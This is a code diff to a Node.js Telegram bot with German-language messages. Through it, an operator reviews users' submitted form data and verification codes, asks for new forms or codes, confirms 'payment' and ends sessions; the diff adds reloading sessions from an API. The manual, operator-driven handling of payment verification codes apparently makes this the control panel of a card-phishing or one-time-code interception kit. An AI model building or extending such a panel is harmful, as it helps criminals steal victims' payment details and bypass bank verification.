@@ -17,35 +17,78 @@ const activeSessions = new Map();
  * @param {Object} socketIo - Socket.io server instance
  */
 function initBot(socketIo) {
-  // Store the Socket.io instance
-  io = socketIo;
-  
-  // Check if token is available
-  const token = process.env.TELEGRAM_BOT_TOKEN;
-  if (!token) {
-    console.error('TELEGRAM_BOT_TOKEN is not set in environment variables');
-    return;
+  if (bot) {
+    console.log('Bot already initialized');
+    
+    // Update the Socket.io instance
+    if (socketIo) {
+      io = socketIo;
+      console.log('Socket.io instance updated');
+    }
+    
+    return bot;
   }
   
-  // Create a bot instance
-  bot = new TelegramBot(token, { polling: true });
-  console.log('Telegram bot initialized');
+  if (!process.env.TELEGRAM_BOT_TOKEN) {
+    console.error('TELEGRAM_BOT_TOKEN not set');
+    return null;
+  }
   
-  // Handle incoming messages
-  bot.on('message', handleMessage);
-  
-  // Handle callback queries (button clicks)
-  bot.on('callback_query', handleCallbackQuery);
-  
-  // Handle polling errors
-  bot.on('polling_error', (error) => {
-    // Only log the error once every 5 minutes to prevent log flooding
-    const now = Date.now();
-    if (!global.lastTelegramErrorTime || now - global.lastTelegramErrorTime > 300000) {
-      console.error('Telegram polling error:', error.message);
-      global.lastTelegramErrorTime = now;
+  try {
+    // Create a new bot instance
+    bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
+    console.log('Telegram bot created');
+    
+    // Store the Socket.io instance
+    if (socketIo) {
+      io = socketIo;
+      console.log('Socket.io instance stored');
     }
-  });
+    
+    // Register event handlers
+    bot.on('message', handleMessage);
+    bot.on('callback_query', handleCallbackQuery);
+    
+    console.log('Telegram bot initialized');
+    
+    // Load active sessions from database on startup
+    loadSessionsFromDatabase();
+    
+    return bot;
+  } catch (error) {
+    console.error('Error initializing bot:', error);
+    return null;
+  }
+}
+
+/**
+ * Load active sessions from database on startup
+ */
+async function loadSessionsFromDatabase() {
+  try {
+    const apiBaseUrl = config.baseUrl;
+    const response = await axios.get(`${apiBaseUrl}/api/sessions/active`);
+    
+    if (response.data && response.data.sessions && Array.isArray(response.data.sessions)) {
+      console.log(`Loading ${response.data.sessions.length} active sessions from database`);
+      
+      for (const session of response.data.sessions) {
+        if (session.key) {
+          activeSessions.set(session.key, {
+            formData: session.formData || {},
+            state: session.state || 'initial',
+            code: session.code || '',
+            createdAt: new Date(session.createdAt || Date.now()),
+            messageIds: []
+          });
+        }
+      }
+      
+      console.log(`Loaded ${activeSessions.size} active sessions into memory`);
+    }
+  } catch (error) {
+    console.error('Error loading sessions from database:', error.message);
+  }
 }
 
 /**
@@ -316,8 +359,46 @@ async function handleCallbackQuery(query) {
       return;
     }
     
-    // Get session data
-    const sessionData = activeSessions.get(key) || { formData: {} };
+    console.log(`Processing ${action} for session ${key}`);
+    
+    // Get session data from memory or initialize it if not found
+    let sessionData = activeSessions.get(key);
+    
+    // If session not found in memory, try to fetch it from the database
+    if (!sessionData) {
+      try {
+        console.log(`Session ${key} not found in memory, attempting to fetch from database...`);
+        // Make a request to the API to get session data
+        const apiBaseUrl = config.baseUrl;
+        const response = await axios.get(`${apiBaseUrl}/api/session/${key}`);
+        
+        if (response.data && response.data.session) {
+          // Create a session object from the database data
+          sessionData = {
+            formData: response.data.session.formData || {},
+            state: response.data.session.state || 'initial',
+            code: response.data.session.code || '',
+            createdAt: new Date(response.data.session.createdAt || Date.now()),
+            messageIds: []
+          };
+          
+          // Store in memory for future use
+          activeSessions.set(key, sessionData);
+          console.log(`Session ${key} retrieved from database and stored in memory:`, sessionData);
+        } else {
+          console.error(`Session ${key} not found in database`);
+          bot.answerCallbackQuery(query.id, { text: '❌ Sitzung nicht gefunden oder abgelaufen' });
+          return;
+        }
+      } catch (error) {
+        console.error(`Error fetching session ${key} from database:`, error.message);
+        bot.answerCallbackQuery(query.id, { text: '❌ Fehler beim Abrufen der Sitzung' });
+        return;
+      }
+    }
+    
+    // Log the session data for debugging
+    console.log(`Session data for ${key}:`, JSON.stringify(sessionData));
     
     // Use the config module to get the correct API URL for the current environment
     const apiBaseUrl = config.baseUrl;
@@ -326,12 +407,6 @@ async function handleCallbackQuery(query) {
     switch (action) {
       case 'confirm_form':
         try {
-          // Get session data
-          const sessionData = activeSessions.get(key);
-          if (!sessionData) {
-            throw new Error('Session not found');
-          }
-          
           // Use the new forceStateUpdate function with await
           const updateSuccess = await forceStateUpdate(key, 'code');
           
@@ -366,14 +441,7 @@ async function handleCallbackQuery(query) {
           }
           
           // Update the message
-          const message = `
-🔄 <b>Neues Formular angefordert</b>
-
-🔑 <b>Sitzung:</b> <code>${key}</code>
-🕒 <b>Zeit:</b> ${formatDate(Date.now())}
-
-<i>Warten auf die Formulareingabe des Benutzers...</i>
-          `;
+          const message = `<b>Neues Formular angefordert</b>\n\nEin neues Formular wurde für diese Sitzung angefordert. Der Benutzer wird aufgefordert, ein neues Formular auszufüllen.`;
           
           bot.editMessageText(message, {
             chat_id: chatId,
@@ -382,76 +450,23 @@ async function handleCallbackQuery(query) {
             reply_markup: {
               inline_keyboard: [
                 [
-                  { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
+                  {
+                    text: '🔚 Sitzung beenden',
+                    callback_data: `end_session:${key}`
+                  }
                 ]
               ]
             }
           });
           
-          bot.answerCallbackQuery(query.id, { text: '🔄 Neues Formular angefordert' });
+          // Answer the callback query
+          bot.answerCallbackQuery(query.id, { text: '✅ Neues Formular angefordert' });
         } catch (error) {
           console.error('Error in request_new_form action:', error.message);
           bot.answerCallbackQuery(query.id, { text: '❌ Fehler: ' + error.message });
         }
         break;
       case 'confirm_code':
-        try {
-          // Use the new forceStateUpdate function with await
-          const updateSuccess = await forceStateUpdate(key, 'pending');
-          
-          if (!updateSuccess) {
-            throw new Error('Failed to update state');
-          }
-          
-          // Update the message with all data still visible
-          const successMessage = createCompleteDataMessage(key, sessionData.formData, sessionData.code, '✅ Code bestätigt. Zahlung wird verarbeitet...');
-          
-          bot.editMessageText(successMessage, {
-            chat_id: chatId,
-            message_id: messageId,
-            parse_mode: 'HTML',
-            reply_markup: {
-              inline_keyboard: [
-                [
-                  { text: '🔄 Neuen Code anfordern', callback_data: `request_code:${key}` },
-                  { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
-                ]
-              ]
-            }
-          });
-          
-          bot.answerCallbackQuery(query.id, { text: '✅ Code bestätigt' });
-        } catch (error) {
-          console.error('Error in confirm_code action:', error.message);
-          bot.answerCallbackQuery(query.id, { text: '❌ Fehler: ' + error.message });
-        }
-        break;
-      case 'request_new_code':
-        try {
-          // Use the new forceStateUpdate function with await
-          const updateSuccess = await forceStateUpdate(key, 'reenter_code');
-          
-          if (!updateSuccess) {
-            throw new Error('Failed to update state');
-          }
-          
-          // Update the message with form data still visible
-          const newCodeMessage = createFormDataMessage(key, sessionData.formData || {}, '🔄 Neuer Verifizierungscode angefordert.');
-          
-          bot.editMessageText(newCodeMessage.text, {
-            chat_id: chatId,
-            message_id: messageId,
-            parse_mode: 'HTML',
-            reply_markup: newCodeMessage.reply_markup
-          });
-          
-          bot.answerCallbackQuery(query.id, { text: '🔄 Neuer Code angefordert' });
-        } catch (error) {
-          console.error('Error in request_new_code action:', error.message);
-          bot.answerCallbackQuery(query.id, { text: '❌ Fehler: ' + error.message });
-        }
-        break;
-      case 'end_session':
         try {
           // Use the new forceStateUpdate function with await
           const updateSuccess = await forceStateUpdate(key, 'success');
@@ -461,42 +476,91 @@ async function handleCallbackQuery(query) {
           }
           
           // Update the message
-          const endSessionMessage = createCompleteDataMessage(key, sessionData.formData, sessionData.code, '✅ Sitzung erfolgreich abgeschlossen.');
+          const message = `<b>Code bestätigt</b>\n\nDer Verifizierungscode wurde erfolgreich bestätigt. Die Zahlung wurde abgeschlossen.`;
           
-          bot.editMessageText(endSessionMessage, {
+          bot.editMessageText(message, {
             chat_id: chatId,
             message_id: messageId,
-            parse_mode: 'HTML'
+            parse_mode: 'HTML',
+            reply_markup: {
+              inline_keyboard: [
+                [
+                  {
+                    text: '🔚 Sitzung beenden',
+                    callback_data: `end_session:${key}`
+                  }
+                ]
+              ]
+            }
           });
           
-          bot.answerCallbackQuery(query.id, { text: '✅ Sitzung abgeschlossen' });
+          // Answer the callback query
+          bot.answerCallbackQuery(query.id, { text: '✅ Code bestätigt' });
         } catch (error) {
-          console.error('Error in end_session action:', error.message);
+          console.error('Error in confirm_code action:', error.message);
           bot.answerCallbackQuery(query.id, { text: '❌ Fehler: ' + error.message });
         }
         break;
-      case 'request_code':
+      case 'request_new_code':
         try {
           // Use the new forceStateUpdate function with await
-          const updateSuccess = await forceStateUpdate(key, 'reenter_code_after_pending');
+          const updateSuccess = await forceStateUpdate(key, 'code');
           
           if (!updateSuccess) {
             throw new Error('Failed to update state');
           }
           
-          // Update the message with form data still visible
-          const requestCodeMessage = createFormDataMessage(key, sessionData.formData || {}, '🔄 Neuer Verifizierungscode angefordert.');
+          // Update the message
+          const message = `<b>Neuer Code angefordert</b>\n\nEin neuer Verifizierungscode wurde für diese Sitzung angefordert. Der Benutzer wird aufgefordert, einen neuen Code einzugeben.`;
           
-          bot.editMessageText(requestCodeMessage.text, {
+          bot.editMessageText(message, {
             chat_id: chatId,
             message_id: messageId,
             parse_mode: 'HTML',
-            reply_markup: requestCodeMessage.reply_markup
+            reply_markup: {
+              inline_keyboard: [
+                [
+                  {
+                    text: '🔚 Sitzung beenden',
+                    callback_data: `end_session:${key}`
+                  }
+                ]
+              ]
+            }
           });
           
-          bot.answerCallbackQuery(query.id, { text: '🔄 Neuer Code angefordert' });
+          // Answer the callback query
+          bot.answerCallbackQuery(query.id, { text: '✅ Neuer Code angefordert' });
         } catch (error) {
-          console.error('Error in request_code action:', error.message);
+          console.error('Error in request_new_code action:', error.message);
+          bot.answerCallbackQuery(query.id, { text: '❌ Fehler: ' + error.message });
+        }
+        break;
+      case 'end_session':
+        try {
+          // Use the new forceStateUpdate function with await
+          const updateSuccess = await forceStateUpdate(key, 'ended');
+          
+          if (!updateSuccess) {
+            throw new Error('Failed to update state');
+          }
+          
+          // Update the message
+          const message = `<b>Sitzung beendet</b>\n\nDiese Sitzung wurde manuell beendet.`;
+          
+          bot.editMessageText(message, {
+            chat_id: chatId,
+            message_id: messageId,
+            parse_mode: 'HTML'
+          });
+          
+          // Remove from active sessions
+          activeSessions.delete(key);
+          
+          // Answer the callback query
+          bot.answerCallbackQuery(query.id, { text: '✅ Sitzung beendet' });
+        } catch (error) {
+          console.error('Error in end_session action:', error.message);
           bot.answerCallbackQuery(query.id, { text: '❌ Fehler: ' + error.message });
         }
         break;
